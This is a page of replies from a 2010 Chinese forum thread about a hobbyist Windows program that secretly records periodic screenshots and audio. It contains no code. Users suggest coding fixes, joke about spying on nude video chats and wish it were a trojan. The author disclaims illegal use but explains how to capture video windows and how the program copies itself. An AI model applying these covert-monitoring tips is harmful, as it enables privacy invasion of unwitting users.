							<em onclick="$('postmessage_475374').className='t_smallfont'">小</em>												发表于 2010-2-10 15:19&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=10473" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_10"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_10"></div><div id="ad_thread4_10"></div>
						
						
																											<div id="postmessage_475374" class="t_msgfont">完全看不懂，直接弄到最后打这句话。</div>

							
							
							
							
															<div id="post_rate_div_475374"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475374_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=10473" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475374&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475374)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_10"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475413" summary="pid475413" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=9920" target="_blank" id="userinfo475413" class="dropmenu" onmouseover="showMenu(this.id)">苏叶</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">打酱油风月党</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=9920">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=9920&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_11" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475413" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475413', '话题链接已经复制到剪贴板')">12楼</strong>
													<em onclick="$('postmessage_475413').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475413').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475413').className='t_smallfont'">小</em>												发表于 2010-2-10 15:49&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=9920" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_11"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_11"></div><div id="ad_thread4_11"></div>
						
						
																											<div id="postmessage_475413" class="t_msgfont">这个能用来做什么？不明真相了……</div>

							
							
							
							
															<div id="post_rate_div_475413"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475413_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=9920" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475413&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475413)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_11"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475458" summary="pid475458" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=1909" target="_blank" id="userinfo475458" class="dropmenu" onmouseover="showMenu(this.id)">单手扶墙</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">活了几十年年，没能为党为人民做点什么，每思及此，心神不宁。</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=1909">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=1909&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_12" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475458" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475458', '话题链接已经复制到剪贴板')">13楼</strong>
													<em onclick="$('postmessage_475458').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475458').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475458').className='t_smallfont'">小</em>												发表于 2010-2-10 16:22&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=1909" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_12"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_12"></div><div id="ad_thread4_12"></div>
						
						
																											<div id="postmessage_475458" class="t_msgfont">菜鸟同问。。用来干什么？</div>

							
							
							
							
															<div id="post_rate_div_475458"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475458_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=1909" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475458&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475458)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_12"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475460" summary="pid475460" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12101" target="_blank" id="userinfo475460" class="dropmenu" onmouseover="showMenu(this.id)">devymex</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Devymex真身，Twitter: @devymex</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12101">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12101&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_13" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475460" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475460', '话题链接已经复制到剪贴板')">14楼</strong>
													<em onclick="$('postmessage_475460').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475460').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475460').className='t_smallfont'">小</em>												发表于 2010-2-10 16:23&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=12101" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_13"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_13"></div><div id="ad_thread4_13"></div>
						
						
																											<div id="postmessage_475460" class="t_msgfont">解释也放到贴子里了。这程序不敢让google搜到，搜到就没用了。所以只好发到这里，呵呵</div>

							
							
							
							
															<div id="post_rate_div_475460"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475460_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12101" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475460&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475460)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_13"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475491" summary="pid475491" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=2930" target="_blank" id="userinfo475491" class="dropmenu" onmouseover="showMenu(this.id)">SrAcer</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">党强加于人的世界观在无法理解它的人们那里最容易被接受。——《１９８４》</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=2930">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=2930&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_14" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475491" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475491', '话题链接已经复制到剪贴板')">15楼</strong>
													<em onclick="$('postmessage_475491').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475491').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475491').className='t_smallfont'">小</em>												发表于 2010-2-10 16:39&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=2930" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_14"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_14"></div><div id="ad_thread4_14"></div>
						
						
																											<div id="postmessage_475491" class="t_msgfont">楼主有古代码武士之风啊。我也喜欢这样编码呢。不过最近在学C#，也很喜欢。<br />
<br />
我的建议：<br />
1、用硬路径不太好，改用GetSystemDirectory吧。<br />
2、 CreateMutex放在WinMain开始比较好。<br />
3、加一个系统全局热键方便退出。<br />
4、检查磁盘空间，不充裕时自动删除最旧记录。<br />
<br />
[<i> 本帖最后由 SrAcer 于 2010-2-10 16:50 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_475491"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475491_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=2930" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475491&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475491)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_14"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475527" summary="pid475527" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12101" target="_blank" id="userinfo475527" class="dropmenu" onmouseover="showMenu(this.id)">devymex</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Devymex真身，Twitter: @devymex</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12101">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12101&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_15" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475527" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475527', '话题链接已经复制到剪贴板')">16楼</strong>
													<em onclick="$('postmessage_475527').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475527').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475527').className='t_smallfont'">小</em>												发表于 2010-2-10 17:03&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=12101" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_15"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_15"></div><div id="ad_thread4_15"></div>
						
						
																											<div id="postmessage_475527" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>SrAcer</i> 于 2010-2-10 16:39 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=475491&amp;ptid=37210" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
楼主有古代码武士之风啊。我也喜欢这样编码呢。不过最近在学C#，也很喜欢。<br />
<br />
我的建议：<br />
1、用硬路径不太好，改用GetSystemDirectory吧。<br />
2、 CreateMutex放在WinMain开始比较好。<br />
3、加一个系统全局热键方便退 ... </blockquote></div>非常感谢您的指教，但我有一点不敢苟同，见谅<br />
CreateMutex放在后面是有逻辑的，将自身的复本放到另一个目录并顺利启动必须放在CreateMutex之后，否则复本无法启动。<br />
<br />
硬路径纯属偷懒，呵呵，已经修正。<br />
增加一个系统热键用于退出：Win+PrtSc<br />
最后一个功能考虑添加。<br />
<br />
再次感谢！<br />
<br />
[<i> 本帖最后由 devymex 于 2010-2-10 23:24 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_475527"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475527_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12101" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475527&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475527)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_15"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475636" summary="pid475636" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=2930" target="_blank" id="userinfo475636" class="dropmenu" onmouseover="showMenu(this.id)">SrAcer</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">党强加于人的世界观在无法理解它的人们那里最容易被接受。——《１９８４》</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=2930">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=2930&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_16" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475636" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475636', '话题链接已经复制到剪贴板')">17楼</strong>
													<em onclick="$('postmessage_475636').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475636').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475636').className='t_smallfont'">小</em>												发表于 2010-2-10 18:24&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=2930" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_16"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_16"></div><div id="ad_thread4_16"></div>
													<h2>回复 17楼 devymex 的话题</h2>
						
						
																											<div id="postmessage_475636" class="t_msgfont">按程序逻辑CreateMutex是该放前面的。只要在CreateMutex前再加个Sleep(1000)就可以解决副本启动问题了，对吧。但这也是偷懒做法。正确做法之一是另加个标识安装的全局物件（如Mutex），不过对小程序而言稍嫌麻烦。<br />
<br />
楼主你就Sleep(1000)吧。嘻嘻。</div>

							
							
							
							
															<div id="post_rate_div_475636"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475636_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=2930" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475636&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475636)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_16"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475963" summary="pid475963" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=8405" target="_blank" id="userinfo475963" class="dropmenu" onmouseover="showMenu(this.id)">depthsky</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">www.depthsky.com</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=8405">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=8405&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_17" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475963" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475963', '话题链接已经复制到剪贴板')">18楼</strong>
													<em onclick="$('postmessage_475963').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475963').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475963').className='t_smallfont'">小</em>												发表于 2010-2-10 22:08&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=8405" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_17"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_17"></div><div id="ad_thread4_17"></div>
						
						
																											<div id="postmessage_475963" class="t_msgfont">给exe吧~~~真看不懂~~~</div>

							
							
							
							
															<div id="post_rate_div_475963"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475963_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://www.depthsky.com" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=8405" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475963&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475963)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_17"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid476032" summary="pid476032" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=1136" target="_blank" id="userinfo476032" class="dropmenu" onmouseover="showMenu(this.id)">bbscn</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">长期不明真相的围观群众</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=1136">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=1136&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_18" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum476032" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid476032', '话题链接已经复制到剪贴板')">19楼</strong>
													<em onclick="$('postmessage_476032').className='t_bigfont'">大</em>							<em onclick="$('postmessage_476032').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_476032').className='t_smallfont'">小</em>												发表于 2010-2-10 22:43&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=1136" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_18"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_18"></div><div id="ad_thread4_18"></div>
						
						
																											<div id="postmessage_476032" class="t_msgfont">10行（还包含一个空行）脚本实现15秒截屏一次的功能（os x 10.5.8测试通过，*nix的xwindow应该都可以）。。。。<br />
<img src="http://imgur.com/SVU9b.png" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /><br />
其实lz这段代码没啥意义，15秒截一次屏然后保存没有优化时间长了文件夹超大，其次调用win32 API没法截取视频层。<br />
简单的说，就是你偷偷把这个 程序运行在某台电脑上，一个傻瓜用这台电脑和别人裸聊，截下来视频那一块是黑的</div>

							
							
							
							
															<div id="post_rate_div_476032"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo476032_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=1136" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=476032&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 476032)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_18"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid476114" summary="pid476114" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=1474" target="_blank" id="userinfo476114" class="dropmenu" onmouseover="showMenu(this.id)">左岸←右岸</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">把你的子宫钉到我的墙上，这样我便会记得你。我们必须走了。明天，明天…</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=1474">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=1474&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_19" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum476114" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid476114', '话题链接已经复制到剪贴板')">20楼</strong>
													<em onclick="$('postmessage_476114').className='t_bigfont'">大</em>							<em onclick="$('postmessage_476114').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_476114').className='t_smallfont'">小</em>												发表于 2010-2-10 23:25&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=1474" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_19"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_19"></div><div id="ad_thread4_19"></div>
						
						
																											<div id="postmessage_476114" class="t_msgfont">``````静观裸聊人士······</div>

							
							
							
							
															<div id="post_rate_div_476114"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo476114_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=1474" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=476114&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 476114)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_19"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid476115" summary="pid476115" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12101" target="_blank" id="userinfo476115" class="dropmenu" onmouseover="showMenu(this.id)">devymex</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Devymex真身，Twitter: @devymex</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12101">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12101&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_20" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum476115" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid476115', '话题链接已经复制到剪贴板')">21楼</strong>
													<em onclick="$('postmessage_476115').className='t_bigfont'">大</em>							<em onclick="$('postmessage_476115').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_476115').className='t_smallfont'">小</em>												发表于 2010-2-10 23:25&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=12101" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_20"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_20"></div><div id="ad_thread4_20"></div>
						
						
																											<div id="postmessage_476115" class="t_msgfont">回复 18楼 SrAcer<br />
关于这个问题，我想现在程序这样的逻辑是没错的。即使Mutex前的代码同时运行多次也没有关系，这里的Mutex仅是为了防止多个程序一起记录，生成重复的文件。<br />
<br />
回复 20楼 bbscn<br />
重申：<font color="red">严禁将此程序用在窃取他人隐私等非法用途，代码仅供参考与讨论！</font><br />
<br />
如果视频截不到图，请禁用DirectDraw的硬件加速。在XP下的方法如下：<br />
1. 点击开始-&gt;运行（或直接按Win+R键）。<br />
2. 输入“dxdiag”<br />
3. 点击“显示”选项卡<br />
4. 点击在“DirectDraw加速”左边的“禁用”按钮，点确定。<br />
<br />
关于录音记录文件的体积，正在研究将wav编码为mp3。初步构想用Lame的VBR编码，可以压缩到原先的30%~40%，但是必须要多带一个dll。<br />
关于屏幕图像，我的显示器分辨率是1280X1024（不能算小了），生成的图像数据量大概是1小时23MB，如果是普通的1280宽屏，不会超过1小时20MB。另外记录文件应该定时清理。<br />
<br />
[<i> 本帖最后由 devymex 于 2010-2-11 00:20 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_476115"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo476115_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12101" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=476115&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 476115)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_20"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid476336" summary="pid476336" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=5398" target="_blank" id="userinfo476336" class="dropmenu" onmouseover="showMenu(this.id)">roc918</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">大森林</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=5398">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=5398&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_21" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum476336" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid476336', '话题链接已经复制到剪贴板')">22楼</strong>
													<em onclick="$('postmessage_476336').className='t_bigfont'">大</em>							<em onclick="$('postmessage_476336').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_476336').className='t_smallfont'">小</em>												发表于 2010-2-11 05:20&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=5398" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_21"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_21"></div><div id="ad_thread4_21"></div>
						
						
																											<div id="postmessage_476336" class="t_msgfont">能挂木马就好了</div>

							
							
							
							
															<div id="post_rate_div_476336"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo476336_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=5398" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=476336&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 476336)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_21"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid476344" summary="pid476344" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=11579" target="_blank" id="userinfo476344" class="dropmenu" onmouseover="showMenu(this.id)">Chinais</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=11579">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=11579&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_22" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->
